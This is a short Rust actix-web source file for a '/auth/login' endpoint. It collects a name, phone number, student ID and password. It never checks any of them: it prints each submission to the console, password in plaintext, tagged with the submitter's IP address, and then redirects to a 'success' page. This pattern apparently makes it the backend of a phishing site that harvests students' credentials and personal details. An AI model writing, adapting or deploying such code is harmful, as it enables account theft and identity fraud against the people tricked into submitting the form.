use actix_web::{HttpRequest, HttpResponse, http::header, post, web};
use colored::Colorize;
use serde::Deserialize;

#[derive(Debug, Deserialize)]
struct InfoForm {
    name: String,
    phone: String,
    student_id: String,
    password: String,
    agree: String,
}

#[post("/auth/login")]
pub async fn submit(req: HttpRequest, form: web::Form<InfoForm>) -> HttpResponse {
    if let Some(addr) = req.peer_addr() {
        println!(
            "{}{}",
            "[!] New submission from ".bright_blue(),
            addr.to_string().bright_red().bold()
        );
    } else {
        println!("{}", "[!] New submission".bright_blue());
        println!("{}", "Warn: unable to get client addr".bright_red())
    }
    print!(
        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
        "Name".bright_red().bold(),
        form.name,
        "Phone".bright_red().bold(),
        form.phone,
        "Student ID".bright_red().bold(),
        form.student_id,
        "Password".bright_red().bold(),
        form.password
    );
    HttpResponse::Found()
        .insert_header((header::LOCATION, "/login/success.html"))
        .finish()
}
